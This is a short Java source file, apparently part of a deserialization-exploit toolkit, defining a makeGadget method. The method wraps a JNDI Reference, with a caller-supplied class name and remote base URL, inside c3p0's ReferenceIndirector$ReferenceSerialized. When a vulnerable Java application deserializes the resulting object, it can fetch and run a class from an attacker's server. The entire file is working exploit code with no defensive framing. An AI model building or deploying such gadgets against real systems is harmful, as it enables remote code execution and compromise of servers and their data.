package gadgets;

import common.Reflections;

import javax.naming.Reference;
import java.lang.reflect.Method;

public class ReferenceSerializedNode {

    public static Object makeGadget(String className,String baseUrl) throws Exception {
        Reference reference = new Reference("payload", className, baseUrl);
        Object obj = Reflections.newInstanceWithOnlyConstructor("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized",reference,null,null,null);
        return obj;
    }

}
